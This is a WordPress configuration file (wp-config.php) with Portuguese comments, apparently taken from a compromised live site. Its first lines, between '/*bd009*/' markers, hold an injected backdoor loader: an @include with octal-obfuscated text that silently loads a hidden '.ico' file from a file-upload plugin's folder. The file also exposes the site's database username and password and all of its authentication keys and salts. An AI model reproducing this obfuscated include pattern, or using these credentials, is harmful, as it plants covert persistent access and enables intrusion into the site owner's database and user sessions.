<?php
/*bd009*/

@include "\057ho\155e/\146il\157ne\165c/\160ub\154ic\137ht\155l/\167p-\143on\164en\164/p\154ug\151ns\057dr\141g-\141nd\055dr\157p-\155ul\164ip\154e-\146il\145-u\160lo\141d-\143on\164ac\164-f\157rm\0557/\056ff\14312\14344\056ic\157";

/*bd009*/
/**
 * A configuração de base do WordPress
 *
 * Este ficheiro define os seguintes parâmetros: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, e ABSPATH. Pode obter mais informação
 * visitando {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} no Codex. As definições de MySQL são-lhe fornecidas pelo seu serviço de alojamento.
 *
 * Este ficheiro contém as seguintes configurações:
 *
 * * Configurações de  MySQL
 * * Chaves secretas
 * * Prefixo das tabelas da base de dados
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** Definições de MySQL - obtenha estes dados do seu serviço de alojamento** //
/** O nome da base de dados do WordPress */
define( 'DB_NAME', 'filoneuc_site' );

/** O nome do utilizador de MySQL */
define( 'DB_USER', 'filoneuc_admin' );

/** A password do utilizador de MySQL  */
define( 'DB_PASSWORD', '+vm8rQ&{VLO%' );

/** O nome do serviddor de  MySQL  */
define( 'DB_HOST', 'localhost' );

/** O "Database Charset" a usar na criação das tabelas. */
define( 'DB_CHARSET', 'utf8mb4' );

/** O "Database Collate type". Se tem dúvidas não mude. */
define('DB_COLLATE', '');

/**#@+
 * Chaves únicas de autenticação.
 *
 * Mude para frases únicas e diferentes!
 * Pode gerar frases automáticamente em {@link https://api.wordpress.org/secret-key/1.1/salt/ Serviço de chaves secretas de WordPress.org}
 * Pode mudar estes valores em qualquer altura para invalidar todos os cookies existentes o que terá como resultado obrigar todos os utilizadores a voltarem a fazer login
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '6GrU}p:oA(xF=GFtsjUrCiCQT>0!o^.x[7nScQgxG$= Kh=tjO&e$F!64ws%x*ck' );
define( 'SECURE_AUTH_KEY',  '[XTc%,~lG40<O}r}FH4#/0^.=xV.Zl@guQHvTL[<f@(Y#zm7qlad_t^ nG=Y%0?Z' );
define( 'LOGGED_IN_KEY',    '-gU]/F@n1OLP~*l[W@ 5;%@5ex7=7-!iRfy7TZ^b5R&?0Y:T(PjPvb;`-;vZ+D9l' );
define( 'NONCE_KEY',        '_<2u4-hV&=VGydd)=NIU~tKL&SHf`-mTWD0g(ax~j|S_LU_1e?w{R6u]fWc#G9Gi' );
define( 'AUTH_SALT',        '_syy;W;~+-ql5aorGE:/PEc;2x95 GNm3w(-k!]sOsBEDfn2n`Zvzgvr%?K5kJqE' );
define( 'SECURE_AUTH_SALT', 'p=)4ZKk/GO|v2Zo64mCPp.;sI|%&,>8P(n-YifiW8IW6WXKp7+$cv$_/9keRfgd|' );
define( 'LOGGED_IN_SALT',   ':K8tysYww`MOK/k4G&/TO96j56h1u6z5P1sD-yDa,tThyAI/x80b*68DFPHMk*PI' );
define( 'NONCE_SALT',       'rlD*=~GL8{Oi{Upg](#-<(eUueI<R-F<3V&K+,+GwTwbPp&D*?OXp)xC5s|k?wP`' );

/**#@-*/

/**
 * Prefixo das tabelas de WordPress.
 *
 * Pode suportar múltiplas instalações numa só base de dados, ao dar a cada
 * instalação um prefixo único. Só algarismos, letras e underscores, por favor!
 */
$table_prefix = 'filoneuc_';

/**
 * Para developers: WordPress em modo debugging.
 *
 * Mude isto para true para mostrar avisos enquanto estiver a testar.
 * É vivamente recomendado aos autores de temas e plugins usarem WP_DEBUG
 * no seu ambiente de desenvolvimento.
 *
 * Para mais informações sobre outras constantes que pode usar para debugging,
 * visite o Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);
define('WP_POST_REVISIONS', 4 );
define('DISALLOW_FILE_EDIT', true );

/* E é tudo. Pare de editar! */

/** Caminho absoluto para a pasta do WordPress. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Define as variáveis do WordPress e ficheiros a incluir. */
require_once(ABSPATH . 'wp-settings.php');
